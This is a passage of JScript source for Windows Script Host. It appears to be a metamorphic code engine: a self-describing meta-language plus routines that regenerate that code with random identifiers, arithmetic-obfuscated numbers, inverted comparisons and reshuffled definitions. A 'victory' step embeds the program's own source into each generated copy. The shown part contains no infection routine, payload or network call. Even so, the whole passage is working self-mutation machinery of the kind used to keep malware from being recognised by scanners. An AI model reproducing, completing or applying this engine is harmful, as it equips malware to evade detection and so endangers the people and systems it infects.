                }
                else
                {
                    if(SingleElement.substring(2,3)=='n'&&Math.floor(Math.random()*2)==0)
                    {
                        CalcCode=Variable1+'='+DeriveRestrictVC(Variable2,30)+'@'+DeriveRestrictVC(Variable1,30);
                    }
                    else
                    {
                        CalcCode=Variable1+'='+DeriveRestrictVC(Variable1,30)+'@'+DeriveRestrictVC(Variable2,30);
                    }
                }
            }
            var PMOperator=SingleElement.substring(1,2);
            CalcCode=CalcCode.replace(/@/g,PMOperator);
            RString+=DeriveRestrString+CalcCode+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,1)=='x')
        {
            //xCode
            //xWScript.Echo("ExecuteMe!");        
            var ExecuteableCode=SingleElement.substring(1);
            RString+=CreateExecution(ExecuteableCode)+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,1)=='y')
        {
            //yCode
            //yXXX=something
            // mainly for changing variables
            var ExecuteableCode=SingleElement.substring(1);
            RString+=CreateExecution(ExecuteableCode,1)+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,4)=='def ')
        {
            // def variable=something
            
            
            //var SingleVariableName=SingleElement.substring(4,SingleElement.indexOf('='));   // Old methode, makes too much problems, and seems to be redundant in the new permutator process
            //var SingleVariableDef=SingleElement.substring(SingleElement.indexOf('=')+1);
            //VarNames.push(SingleVariableName);
            //VarDefs.push(SingleVariableDef);    
    
            var dExecuteableCode=SingleElement.substring(4);
            RString+=CreateExecution(dExecuteableCode,0)+'@;'+s(13)+s(10)
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,4)=='var ')
        {
            // def variable=something
            //var PreSingleVariableName=SingleElement.substring(0,SingleElement.indexOf('='));
            //var SingleVariableDef=SingleElement.substring(SingleElement.indexOf('=')+1);
            RString+=CreateExecution(SingleElement,1)+'@;'+s(13)+s(10)
            //LocalVarName.push(SingleVariableName); // Old Methode
            //LocalVarDefs.push(SingleVariableDef);
            CodeLineIndex++;
        }

        if(SingleElement.substring(0,9)=='function ')
        {
            //function abc(arg1,arg2)001__xWScript.Echo(arg1)

            var functionname      =SingleElement.substring(9,SingleElement.indexOf('('));
            var functionarguments =SingleElement.substring(SingleElement.indexOf('('),SingleElement.indexOf(')')+1);
            var NumOfElementsCode =parseInt(SingleElement.substring(SingleElement.indexOf(')')+1),10);
            var ExecuteCode       =CodeBlockArray.slice(CodeLineIndex+1,CodeLineIndex+NumOfElementsCode+1);
            FunctionDefs.push(CreateBlockOfCode(ExecuteCode))
            FunctionArgs.push(functionarguments);
            FunctionNames.push(functionname);          
            CodeLineIndex+=NumOfElementsCode+1;
        }
        if(SingleElement.substring(0,7)=='victory')
        {
            //victory
            // binds the source to the compiler

            if(Math.round(Math.random()*2)>0)
            {
                RString+='var ';
            }
            WScript.Echo("in victory1: "+MetaLevelLanguage.length)
            while(OriginalMetaCode.indexOf("°+")!=-1)
            {
                OriginalMetaCode=OriginalMetaCode.replace("°+","(-:");
                OriginalMetaCode=OriginalMetaCode.replace("+°",":-)");  // Happy code is happy :)                
            }
            WScript.Echo("in victory2: "+MetaLevelLanguage.length)
            RString+='sMetaLevelLanguage='+CreateString(OriginalMetaCode)+'@;'+s(13)+s(10);
            CodeLineIndex++;
        }
    }
    HierarchyOfCalls--;
    // include local variables
    LocalVarName.reverse();
    LocalVarDefs.reverse();
    while(LocalVarName.length>0)
    {
        var FirstPos=RString.indexOf(LocalVarName[0]);
        var PotentialPos=FindPositionForCode(RString,FirstPos);
        var CodeVarIntegrate='var '+LocalVarName[0]+'='+LocalVarDefs[0]+'@;'
        LocalVarName.splice(0,1);
        LocalVarDefs.splice(0,1);
        NewVarPos=PotentialPos[Math.floor(Math.random()*PotentialPos.length)];
        RString=RString.substring(0,NewVarPos)+CodeVarIntegrate+RString.substring(NewVarPos);
    }
    if(HierarchyOfCalls!=0)
    {
        while(RString.indexOf('@;')!=-1){RString=RString.replace('@;',';'+nnn);}
        while(RString.indexOf('@;')!=-1){RString=RString.replace('@',nnn);}
    }
    if(RString==''){WScript.Echo("RString !!is empty!"+String.fromCharCode(13,10)+CodeBlockArray);} // Debugging info
    return(RString);
}


function CalculateFirstAppearance(OriginalCode,ObjectName)
{
    ObjectPlace=OriginalCode.indexOf(ObjectName);
    if (ObjectPlace==-1)
    {
        GetFunctionN=-1;
        for(n=0;n<FunctionVariableNameArray.length;n++)
        {
            for(m=0;m<FunctionVariableNameArray[n].length;m++)
            {
                if(FunctionVariableNameArray[n][m]==ObjectName){GetFunctionN=n;}
            }
        }
        ObjectPlace=OriginalCode.indexOf(FunctionVariableFctName[GetFunctionN]);
    }
    return(ObjectPlace)
}


function FindPositionForCode(OriginalCode,PosTrace)
{
    var OrigPosTrace=PosTrace;
    var VPosArray=[];
    while(SKPlace!=-1)
    {
        var SKPlace =OriginalCode.lastIndexOf('@;',PosTrace-1);
        var BraPlace=OriginalCode.lastIndexOf('@{',PosTrace-1);
        var KetPlace=OriginalCode.lastIndexOf('@}',PosTrace-1);
        var PosTrace=Math.max(SKPlace,BraPlace,KetPlace);
        if(PosTrace==SKPlace&&SKPlace!=-1)
        {
            VPosArray.push(SKPlace+2);
        }
        if(PosTrace==KetPlace&&PosTrace!=-1)
        {
            FoundKet=1;
            while(FoundKet>0)
            {
                BraPlace=OriginalCode.lastIndexOf('@{',PosTrace-1);
                KetPlace=OriginalCode.lastIndexOf('@}',PosTrace-1);
                if(BraPlace>KetPlace)
                {
                    FoundKet--;
                    PosTrace=BraPlace;
                }
                else
                {
                    FoundKet++;
                    PosTrace=KetPlace;
                }
            }
        }
    }
    VPosArray.push(0);
    return(VPosArray);
}


function CreateVarsAndFuncts(OriginalCode)  // fCreateVarsAndFuncts
{
    TmpVarNames=VarNames.slice();       // save to make function-arrays out of it
    while(VarDefs.length>0)
    {
        NextPlace=CalculateFirstAppearance(OriginalCode,VarNames[0]);
        CodeToIntegrate=VarNames[0]+'='+VarDefs[0]+'@;'
        VarDefs.splice(0,1);
        VarNames.splice(0,1);
        VariablePosArray=FindPositionForCode(OriginalCode,NextPlace);
        NewPos=VariablePosArray[Math.floor(Math.random()*VariablePosArray.length)];
        OriginalCode=OriginalCode.substring(0,NewPos)+CodeToIntegrate+OriginalCode.substring(NewPos);
    }
    NumberOfArrays=Math.floor(Math.random()*TmpVarNames.length/5);
    NumberOfArrays=0;
    for(k=0;k<NumberOfArrays;k++)
    {
        RandNameArr=randomString();
        TmpVarNames=TmpVarNames.sort(RandomizeFunction);   // Special way to randomize an array
        NumberOfArrayEntries=Math.floor(Math.random()*TmpVarNames.length);        
        CodeToIntegrate=RandNameArr+'=[';
        ArrayIndexCounter=0;
        for(i=0;i<NumberOfArrayEntries;i++)
        {
            SearchArrayEntries1=OriginalCode.indexOf(TmpVarNames[i]);
            if(SearchArrayEntries1!=-1)    // first appearance (definition)
            {
                SearchArrayEntries2=OriginalCode.indexOf(TmpVarNames[i],SearchArrayEntries1+1);
                if(SearchArrayEntries2!=-1)    // variable definition (useage)
                {
                    SearchArrayEntries3=OriginalCode.indexOf(TmpVarNames[i],SearchArrayEntries2+1);
                    if(SearchArrayEntries3==-1)    // variable definition (no third one)
                    {
                        SearchArrayEntries4=OriginalCode.indexOf(TmpVarNames[i]+'=');
                        VariableDefinition=OriginalCode.substring(SearchArrayEntries4+TmpVarNames[i].length+1,OriginalCode.indexOf('@;',SearchArrayEntries4));

                        if(Math.random()*4<3)
                        {
                            // function array
                            CodeToIntegrate+='function(){return '+VariableDefinition+';},';

                            OldMarker=OriginalCode.search('@X@');
                            if(OldMarker>SearchArrayEntries4||OldMarker==-1)
                            {   // replace old marker by new one
                                OriginalCode=OriginalCode.replace('@X@','');    // remove old marker 
                                OriginalCode=OriginalCode.replace(TmpVarNames[i]+'='+VariableDefinition+'@;','@X@')  // marker that at least here the function has to be included
                            }
                            else
                            {
                                OriginalCode=OriginalCode.replace(TmpVarNames[i]+'='+VariableDefinition+'@;','')  // remove line and keep old marker
                            }
                            OriginalCode=OriginalCode.replace(TmpVarNames[i],RandNameArr+'['+ArrayIndexCounter+']()');
                            ArrayIndexCounter++;
                        }
                        else
                        {
                            // function
                            RandFuncName=randomString();
                            FunctionNames.push(RandFuncName);
                            FunctionDefs.push('return '+VariableDefinition);
                            FunctionArgs.push('()');
                            OriginalCode=OriginalCode.replace(TmpVarNames[i]+'='+VariableDefinition+'@;','')
                            OriginalCode=OriginalCode.replace(TmpVarNames[i],RandFuncName+'()');                  
                        }
                    }
                }
            }
        }
        CodeToIntegrate=CodeToIntegrate.substring(0,CodeToIntegrate.length-1)+'];'+s(13)+s(10);
        OriginalCode=OriginalCode.replace('@X@',CodeToIntegrate)    
    }
    for(i=0;i<FunctionDefs.length;i++)
    {
        PositionForIntegration=FindPositionForCode(OriginalCode,Infinity);
        IntegrationPosition=PositionForIntegration[Math.floor(Math.random()*PositionForIntegration.length)];
        OriginalCode=OriginalCode.substring(0,IntegrationPosition)+'function '+FunctionNames[i]+FunctionArgs[i]+'@{'+FunctionDefs[i]+'@}'+s(13)+s(10)+OriginalCode.substring(IntegrationPosition);
    }
    return(OriginalCode);
}

FunctionDefs=[];    // contains names of functions
FunctionArgs=[];    // contains arguments of function, for instance '()' for no arguments
FunctionNames=[];   // contains content of function corresponding to the array FunctionDefs
VarDefs=[];         // contains names of variables
VarNames=[];        // contains content of variables corresponding to the array VarDefs
FunctionVariableFctName=[];   // contains name of functions 
FunctionVariableNameArray=[]; // contains arrays of variable/functionnames corresponding to the array FunctionVariableFctName      
RecordFunctionVariables=0;    // 0=no recording of functionnames; n>0: current recursion depth in functions
RecordFunctionVN=0;     // lowest depth variable name (everything else will be put into FunctionVariableNameArray)
RecordFunctionFN=0;     // lowest depth function name (everything else will be put into FunctionVariableNameArray)
DeriveRestrString="";
NoDerivation1=0;


// REAL STUFF


MetaLevelLanguage='(VDef001|)def sVarDefs=[]';
MetaLevelLanguage+='__(VDef002|)def sVarNames=[]';
MetaLevelLanguage+='__(VDef003|)def sNoDerivation1=#n0n#';
MetaLevelLanguage+='__(VDef004|)def sFunctionDefs=[]';
MetaLevelLanguage+='__(VDef005|)def sFunctionArgs=[]';
MetaLevelLanguage+='__(VDef006|)def sFunctionNames=[]';
MetaLevelLanguage+='__(VDef007|)def sDeriveRestrString=#""#';
MetaLevelLanguage+='__(VDef008|)def sRecordFunctionVariables=#n0n#';
MetaLevelLanguage+='__(VDef009|)def sRecordFunctionVN=#n0n#';
MetaLevelLanguage+='__(VDef010|)def sRecordFunctionFN=#n0n#';
MetaLevelLanguage+='__(VDef011|)def sFunctionVariableFctName=[]';
MetaLevelLanguage+='__(VDef012|)def sFunctionVariableNameArray=[]';
MetaLevelLanguage+='__(MetaDef|)def sMetaLevelLanguage=#""#';
MetaLevelLanguage+='__(VDef014|)def sHierarchyOfCalls=#n0n#';
MetaLevelLanguage+='__(VDef015|)def DoIWriteMetaCode=#n0n#';

MetaLevelLanguage+='__(0100|)function fGiveMeString(argGiveMeString1)001';
    MetaLevelLanguage+='__(GMS100|)xreturn(#x1#O1String#.fromCharCode(°+argGiveMeString1+°)1O#1x#)';

MetaLevelLanguage+='__(0200|)function fGiveRandomNumber(argGiveRandomNumber1)001';
    MetaLevelLanguage+='__(GRN100|)xreturn(#x1#O1Math#.floor(#x2#x3#O2Math#.random()2O#3x#*#x4°+argGiveRandomNumber1+°4x#2x#)1O#1x#)';

MetaLevelLanguage+='__(0300|)function fGiveRandomString()006';
    MetaLevelLanguage+='__(GRS100|)var vGiveRandomStringVarrndString=#""#';
    MetaLevelLanguage+='__(GRS200|)var vGiveRandomStringVarRNum3=#x1#x2fGiveRandomNumber(#n10n#)2x#+#x3#n6n#3x#1x#';
    MetaLevelLanguage+='__(GRS300|GRS100,GRS200)while(var vGiveRandomStringC1=0$°+vGiveRandomStringC1+°!°+vGiveRandomStringVarRNum3+°?<@vGiveRandomStringC1=°+vGiveRandomStringC1+° +1)002'
        MetaLevelLanguage+='__(GRSA100|)var vGiveRandomStringSingleChar=fGiveMeString(#x1#x2fGiveRandomNumber(#x3#n26n#3x#)2x#+#x4#n97n#4x#1x#)'
        MetaLevelLanguage+='__(GRSA200|GRSA100)c+s(°+vGiveRandomStringVarrndString+°,°+vGiveRandomStringSingleChar+°)'
    MetaLevelLanguage+='__(GRS400|GRS300)xreturn(#x1°+vGiveRandomStringVarrndString+°1x#)';

MetaLevelLanguage+='__(0400|)function fIsNumber(argisNumber1)006';
    MetaLevelLanguage+='__(isNumber100|)if(#O1°+argisNumber1+°#.charCodeAt(#n0n#)1O#!#n47n#?>)003';
        MetaLevelLanguage+='__(isNumberA100|)if(#O1°+argisNumber1+°#.charCodeAt(#n0n#)1O#!#n58n#?<)001';
            MetaLevelLanguage+='__(isNumberAA100|)xreturn(#x1#n1n#1x#)';
        MetaLevelLanguage+='__(isNumberB100|)000';          // else part is empty
    MetaLevelLanguage+='__(isNumber200|)000';               // else part
    MetaLevelLanguage+='__(isNumber300|isNumber100)xreturn(#x1#n0n#1x#)';

MetaLevelLanguage+='__(0500|)function fGetAntiLogic(argfGetAntiLogic1)014';
    MetaLevelLanguage+='__(GetAntiLogic0100|)var GALRValue=#x1°+argfGetAntiLogic1+°1x#';
    MetaLevelLanguage+='__(GetAntiLogic0200|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#"<"#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#">"#';
    MetaLevelLanguage+='__(GetAntiLogic0300|)000';
    MetaLevelLanguage+='__(GetAntiLogic0400|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#"<="#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#">="#';
    MetaLevelLanguage+='__(GetAntiLogic0500|)000';
    MetaLevelLanguage+='__(GetAntiLogic0600|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#">"#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#"<"#';
    MetaLevelLanguage+='__(GetAntiLogic0700|)000';
    MetaLevelLanguage+='__(GetAntiLogic0800|GetAntiLogic0100)if(°+argfGetAntiLogic1+°!#">="#?==)001';
        MetaLevelLanguage+='__(GetAntiLogicA100|)y°+GALRValue+°=#"<="#';
    MetaLevelLanguage+='__(GetAntiLogic0900|)000';
    MetaLevelLanguage+='__(GetAntiLogic1000|GetAntiLogic0200,GetAntiLogic0400,GetAntiLogic0600,GetAntiLogic0800)xreturn(#x1°+GALRValue+°1x#)';

MetaLevelLanguage+='__(0600|)function fRemoveVariableMask(argRemoveVariableMask1)005';
    MetaLevelLanguage+='__(RVM100|)while($#x1#O1°+argRemoveVariableMask1+°#.indexOf(#x2fGiveMeString(#n176n#)2x#+#x3fGiveMeString(#n43n#)3x#)1O#1x#!#n-1n#?!=@)001';
        MetaLevelLanguage+='__(RVMA100|)y°+argRemoveVariableMask1+°=#x1#O1°+argRemoveVariableMask1+°#.replace(#x2fGiveMeString(#x3#n176n#3x#)2x#+#x4fGiveMeString(#x5#n43n#5x#)4x#,#x6""6x#)1O#1x#';
    MetaLevelLanguage+='__(RVM200|)while($#x1#O1°+argRemoveVariableMask1+°#.indexOf(#x2fGiveMeString(#n43n#)2x#+#x3fGiveMeString(#n176n#)3x#)1O#1x#!#n-1n#?!=@)001';
        MetaLevelLanguage+='__(RVMA100|)y°+argRemoveVariableMask1+°=#x1#O1°+argRemoveVariableMask1+°#.replace(#x2fGiveMeString(#x3#n43n#3x#)2x#+#x4fGiveMeString(#x5#n176n#5x#)4x#,#x6""6x#)1O#1x#';
    MetaLevelLanguage+='__(RVM300|RVM100,RVM200)xreturn(#x1°+argRemoveVariableMask1+°1x#)';


MetaLevelLanguage+='__(0700|)function fRandomizeFunction()001';
    MetaLevelLanguage+='__(RandFunct100|)xreturn(#x1#x2fGiveRandomNumber(#x323x#)2x#-#x414x#1x#)';


MetaLevelLanguage+='__(0800|)function fCreateNumeric(argCreateNumeric)030';
    MetaLevelLanguage+='__(CrNum0100|)yargCreateNumeric=#x3parseInt(#x1°+argCreateNumeric+°1x#,#x2#n10n#2x#)3x#';
    MetaLevelLanguage+='__(CrNum0200|)var CreateNumericType=#x1fGiveRandomNumber(#x2#n8n#2x#)1x#';
    MetaLevelLanguage+='__(CrNum0300|CrNum0100,CrNum0200)if(°+argCreateNumeric+°!#n10000n#?>)001';
        MetaLevelLanguage+='__(CrNumA100|)yCreateNumericType=#x1#n5n#1x#';
    MetaLevelLanguage+='__(CrNum0400|)000';
    MetaLevelLanguage+='__(CrNum0700|CrNum0300)if(°+argCreateNumeric+°!#n0n#?>=)005';
        MetaLevelLanguage+='__(CrNumA100|)if(°+argCreateNumeric+°!#n255n#?<=)003';
            MetaLevelLanguage+='__(CrNumAA100|)if(fGiveRandomNumber(#n4n#)!#n0n#?!=)001';
                MetaLevelLanguage+='__(CrNumAAA100|)xreturn(#x1#x6°+FullArray+°6x#[#x2°+argCreateNumeric+°2x#][#x3fGiveRandomNumber(#x4#O1°+FullArray+°[#x5°+argCreateNumeric+°5x#]#.length1O#4x#)3x#]1x#)';
            MetaLevelLanguage+='__(CrNumAB200|)000';
        MetaLevelLanguage+='__(CrNumA200|)000';
    MetaLevelLanguage+='__(CrNum0800|)000';
    MetaLevelLanguage+='__(CrNum0900|CrNum0100)var CreateNumericRnd=#x1#O3Math#.abs(#x3#O1Math#.floor(#x4#x5#O2Math#.random()2O#*#x70.97x#5x#*#x6°+argCreateNumeric+°6x#4x#)1O#3x#)3O#+#x212x#1x#';
    MetaLevelLanguage+='__(CrNum1000|CrNum0700,CrNum0900)if(°+argCreateNumeric+°!°+CreateNumericRnd+°?<)003';
        MetaLevelLanguage+='__(CrNumA100|)if(°+CreateNumericType+°!#n0n#?==)001';
            MetaLevelLanguage+='__(CrNumAA100|)xreturn(fDeriveVC(°+argCreateNumeric+°,#n200n#))'
        MetaLevelLanguage+='__(CrNumA200|)000';
    MetaLevelLanguage+='__(CrNum1100|)000';
    MetaLevelLanguage+='__(CrNum1200|CrNum1000)if(°+CreateNumericType+°!#n0n#?==)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1#x2#"("#2x#+#x3fDeriveVC(#x8#x4fCreateNumeric(°+argCreateNumeric+°-°+CreateNumericRnd+°)4x#+#x5#"+"#5x#8x#+#x6fCreateNumeric(°+CreateNumericRnd+°)6x#,#x7#n200n#7x#)+#")"#3x#1x#);'
    MetaLevelLanguage+='__(CrNum1300|)000';
    MetaLevelLanguage+='__(CrNum1400|CrNum0700,CrNum0900)if(°+CreateNumericType+°!#n1n#?==)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1#x2#"("#2x#+#x3fDeriveVC(#x8#x4fCreateNumeric(°+argCreateNumeric+° + °+CreateNumericRnd+°)4x#+#x5#"-"#5x#8x#+#x6fCreateNumeric(°+CreateNumericRnd+°)6x#,#x7#n200n#7x#)+#")"#3x#1x#);'
    MetaLevelLanguage+='__(CrNum1500|)000';
    MetaLevelLanguage+='__(CrNum1600|CrNum0700,CrNum0900)if(°+CreateNumericType+°!#n2n#?==)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1#x2#"("#2x#+#x3fDeriveVC(#x8#x4fCreateNumeric(°+argCreateNumeric+°*°+CreateNumericRnd+°)4x#+#x5#"/"#5x#8x#+#x6fCreateNumeric(°+CreateNumericRnd+°)6x#,#x7#n200n#7x#)+#")"#3x#1x#);'
    MetaLevelLanguage+='__(CrNum1700|)000';
    MetaLevelLanguage+='__(CrNum1800|CrNum0700,CrNum0900)if(°+CreateNumericType+°!#n2n#?>)001';
        MetaLevelLanguage+='__(CrNumA100|)xreturn(#x1fDeriveVC(#x2°+argCreateNumeric+°2x#,#x3#n200n#3x#)1x#)';
    MetaLevelLanguage+='__(CrNum1900|)000';




MetaLevelLanguage+='__(0900|)function fCreateLogic(argfCreateLogic)027';
    MetaLevelLanguage+='__(CrLogic0100|)ysDeriveRestrString=#""#';
    MetaLevelLanguage+='__(CrLogic0200|)var CLarg1=#x1#O1°+argfCreateLogic+°#.substring(#x2#n0n#2x#,#O2°+argfCreateLogic+°#.indexOf(#x3#"!"#3x#)2O#)1O#1x#';
    MetaLevelLanguage+='__(CrLogic0300|)var CLarg2=#x1#O1°+argfCreateLogic+°#.substring(#x2#x4#O2°+argfCreateLogic+°#.indexOf(#x7#"!"#7x#)2O#4x#+#x3#n1n#3x#2x#,#x5#O3°+argfCreateLogic+°#.indexOf(#x6#"?"#6x#)3O#5x#)1O#1x#';
    MetaLevelLanguage+='__(CrLogic0400|)var CLlogicoperator=#x1#O1°+argfCreateLogic+°#.substring(#x2#x3#O2°+argfCreateLogic+°#.indexOf(#"?"#)2O#3x#+#x4#n1n#4x#2x#)1O#1x#';
    MetaLevelLanguage+='__(CrLogic0500|CrLogic0400)var CLantilogic=#x1fGetAntiLogic(#x2°+CLlogicoperator+°2x#)1x#';
    MetaLevelLanguage+='__(CrLogic0600|)var CLDeriv=#x1fDeriveRestrictVC1x#';
    MetaLevelLanguage+='__(CrLogic0700|CrLogic0300,CrLogic0600)if(#x1fIsNumber(#x2°+CLarg2+°2x#)1x#!#n1n#?==)001';
        MetaLevelLanguage+='__(CrLogicA100|)yCLDeriv=#x1fDeriveVC1x#';
    MetaLevelLanguage+='__(CrLogic0800|)000';
    MetaLevelLanguage+='__(CrLogic0900|CrLogic0100,CrLogic0200)if(#x1°+sNoDerivation1+°1x#!#n0n#?==)001';
        MetaLevelLanguage+='__(CrLogicA100|)yCLarg1=#x3fDeriveRestrictVC(#x1°+CLarg1+°1x#,#x2#n24n#2x#)3x#';
    MetaLevelLanguage+='__(CrLogic1000|)000';
    MetaLevelLanguage+='__(CrLogic1100|CrLogic0100,CrLogic0300,CrLogic0700)yCLarg2=#x3°+CLDeriv+°(#x1°+CLarg2+°1x#,#x2#n50n#2x#)3x#';
    MetaLevelLanguage+='__(CrLogic1200|)var CLRndNum=#x1fGiveRandomNumber(#n2n#)1x#';
    MetaLevelLanguage+='__(CrLogic1300|CrLogic0400,CrLogic0900,CrLogic1100,CrLogic1200)if(°+CLRndNum+°!#n0n#?==)004';
        MetaLevelLanguage+='__(CrLogicA100|)var CLRV=#""#';
        MetaLevelLanguage+='__(CrLogicA200|CrLogicA100)c+s(°+CLRV+°,#x1°+CLarg1+°1x#)';
        MetaLevelLanguage+='__(CrLogicA300|)c+s(°+CLlogicoperator+°,#x1°+CLarg2+°1x#)';
        MetaLevelLanguage+='__(CrLogicA400|CrLogicA200,CrLogicA300)c+s(°+CLRV+°,#x1°+CLlogicoperator+°1x#)';
    MetaLevelLanguage+='__(CrLogic1400|)000';
    MetaLevelLanguage+='__(CrLogic1500|CrLogic0500,CrLogic0900,CrLogic1100,CrLogic1200)if(#x1°+CLRndNum+°1x#!#n1n#?==)004';
        MetaLevelLanguage+='__(CrLogicA100|)var CLRV=#""#';
        MetaLevelLanguage+='__(CrLogicA200|CrLogicA100)c+s(°+CLRV+°,#x1°+CLarg2+°1x#)';
        MetaLevelLanguage+='__(CrLogicA300|)c+s(°+CLantilogic+°,#x1°+CLarg1+°1x#)';
        MetaLevelLanguage+='__(CrLogicA400|CrLogicA200,CrLogicA300)c+s(°+CLRV+°,#x1°+CLantilogic+°1x#)';
    MetaLevelLanguage+='__(CrLogic1600|)000';
    MetaLevelLanguage+='__(CrLogic1700|CrLogic1300,CrLogic1500)xreturn(#x1°+CLRV+°1x#)';


MetaLevelLanguage+='__(1000|)function fDeriveVC(argDeriveVC1,argDeriveVC2)009';
    MetaLevelLanguage+='__(DVC0100|)var DVCRNum=#x2fGiveRandomNumber(#x1°+argDeriveVC2+°1x#)2x#';
    MetaLevelLanguage+='__(DVC0200|DVC0100)if(#x1°+DVCRNum+°1x#!2?<)005';
        MetaLevelLanguage+='__(DVCA100|)var DVCTmpName=#x1fGiveRandomString()1x#';    
        MetaLevelLanguage+='__(DVCA200|)x#O1sVarDefs#.push(#x1°+argDeriveVC1+°1x#)1O#';
        MetaLevelLanguage+='__(DVCA300|DVCA100)x#O1sVarNames#.push(#x1°+DVCTmpName+°1x#)1O#';
        MetaLevelLanguage+='__(DVCA400|DVCA200,DVCA300)var DVCRname=#x3fDeriveVC(#x1°+DVCTmpName+°1x#,#x2#n30n#2x#)3x#';
        MetaLevelLanguage+='__(DVCA500|DVCA400)xreturn(#x1°+DVCRname+°1x#)';
    MetaLevelLanguage+='__(DVC0300|)000';
    MetaLevelLanguage+='__(DVC0400|DVC0200)xreturn(#x1°+argDeriveVC1+°1x#)';


MetaLevelLanguage+='__(1100|)function fCreateVariableListForFunctionCalls(argCVLCodeStr,argCVLArrOrig,argCVLArrRnd)010';
    MetaLevelLanguage+='__(CVL0100|)var CopyexecCode=#x1#O1°+argCVLCodeStr+°#.toString()1O#1x#';
    MetaLevelLanguage+='__(CVL0200|CVL0100)while($#x1#O1°+CopyexecCode+°#.indexOf(#x2#x3fGiveMeString(#x5#n176n#5x#)3x#+#x4fGiveMeString(#x6#n43n#6x#)4x#2x#)1O#1x#!-1?!=@)002';
        MetaLevelLanguage+='__(CVLA100|)x#O1°+argCVLArrOrig+°#.push(#x1#O2°+CopyexecCode+°#.substring(#x2#O3°+CopyexecCode+°#.indexOf(#x4fGiveMeString(#n176n#)+fGiveMeString(#n43n#)4x#)3O#2x#+#x3#n2n#3x#,#x4#O4°+CopyexecCode+°#.indexOf(#x5#x6fGiveMeString(#n43n#)6x#+#x7fGiveMeString(#n176n#)7x#5x#)4O#4x#)2O#1x#)1O#';
        MetaLevelLanguage+='__(CVLA200|CVLA100)y°+CopyexecCode+°=#x1#O1°+CopyexecCode+°#.substring(#x2#x4#O2°+CopyexecCode+°#.indexOf(#x5#x6fGiveMeString(#n43n#)6x#+#x7fGiveMeString(#n176n#)7x#5x#)2O#4x#+#x3#n2n#3x#2x#)1O#1x#';    
    MetaLevelLanguage+='__(CVL0300|CVL0200)while(var CVLFcount1=#x1#n0n#1x#$#x2°+CVLFcount1+°2x#!#x3#O1°+argCVLArrOrig+°#.length1O#3x#?<@°+CVLFcount1+°=#x1#x2°+CVLFcount1+°2x#+#n1n#1x#)004';
        MetaLevelLanguage+='__(CVLA100|)var RandNameForFuncArg=#x1fGiveRandomString()1x#';
        MetaLevelLanguage+='__(CVLA200|CVLA100)y#O1°+argCVLArrRnd+°#.push(#x1°+RandNameForFuncArg+°1x#)1O#';
        MetaLevelLanguage+='__(CVLA300|CVLA200)while($#x1#O1°+argCVLCodeStr+°#.indexOf(#x2°+argCVLArrOrig+°[#x3°+CVLFcount1+°3x#]2x#)1O#1x#!#x1#n-1n#1x#?!=@)001';
            MetaLevelLanguage+='__(CVLAA100|)y°+argCVLCodeStr+°=#x1#O1°+argCVLCodeStr+°#.replace(#x2°+argCVLArrOrig+°[#x3°+CVLFcount1+°3x#]2x#,#x4°+RandNameForFuncArg+°4x#)1O#1x#';
    MetaLevelLanguage+='__(CVL0400|CVL0300)xreturn(#x1°+argCVLCodeStr+°1x#)';
    

MetaLevelLanguage+='__(1200|)function fGetVariableList(argGetVariableList)006';
    MetaLevelLanguage+='__(GVL0100|)var GVLVarListRV=#""#';
    MetaLevelLanguage+='__(GVL0200|GVL0100)while($#x1#O1°+argGetVariableList+°#.indexOf(#x2#x3fGiveMeString(#x7#n176n#7x#)3x#+#x4fGiveMeString(#x6#n43n#6x#)4x#2x#)1O#1x#!#x5#n-1n#5x#?!=@)003';    
        MetaLevelLanguage+='__(GVLA100|)c+s(°+GVLVarListRV+°,#x1#O1°+argGetVariableList+°#.substring(#x2#O2°+argGetVariableList+°#.indexOf(fGiveMeString(#n176n#)+fGiveMeString(#n43n#))2O#2x#+#n2n#,#x3#O3°+argGetVariableList+°#.indexOf(#x6#x4fGiveMeString(#n43n#)4x#+#x5fGiveMeString(#n176n#)5x#6x#)3O#3x#)+#","#1O#1x#)';
        MetaLevelLanguage+='__(GVLA200|GVLA100)y°+argGetVariableList+°=#x1#O1°+argGetVariableList+°#.replace(#x2#x3fGiveMeString(#n176n#)3x#+#x4fGiveMeString(#n43n#)4x#2x#,#x5#""#5x#)1O#1x#';
        MetaLevelLanguage+='__(GVLA300|GVLA100)y°+argGetVariableList+°=#x1#O1°+argGetVariableList+°#.replace(#x2#x3fGiveMeString(#n43n#)3x#+#x4fGiveMeString(#n176n#)4x#2x#,#x5#""#5x#)1O#1x#';
    MetaLevelLanguage+='__(GVL0300|GVL0200)xreturn(#x1#x2fGiveMeString(#n95n#)2x#+#x4fGiveMeString(#n42n#)4x#+#x5fGiveMeString(#n95n#)5x#+#x6fGiveMeString(#n42n#)6x#+ #x3#O1°+GVLVarListRV+°#.substring(#n0n#,#O2°+GVLVarListRV+°#.length2O#-#n1n#)1O#3x#+#x7fGiveMeString(#n42n#)7x#+#x8fGiveMeString(#n95n#)8x#+#x9fGiveMeString(#n42n#)9x#+fGiveMeString(#n95n#)1x#)';


MetaLevelLanguage+='__(1300|)function fRemoveVariableIndicator(argRemoveVariableIndicator)003';
    MetaLevelLanguage+='__(RVI0100|)while($#x1#O1°+argRemoveVariableIndicator+°#.indexOf(#x3#x2fGiveMeString(#n95n#)2x#+#x4fGiveMeString(#n42n#)4x#+#x5fGiveMeString(#n95n#)5x#+#x6fGiveMeString(#n42n#)6x#3x#)1O#1x#!#n-1n#?!=@)001';
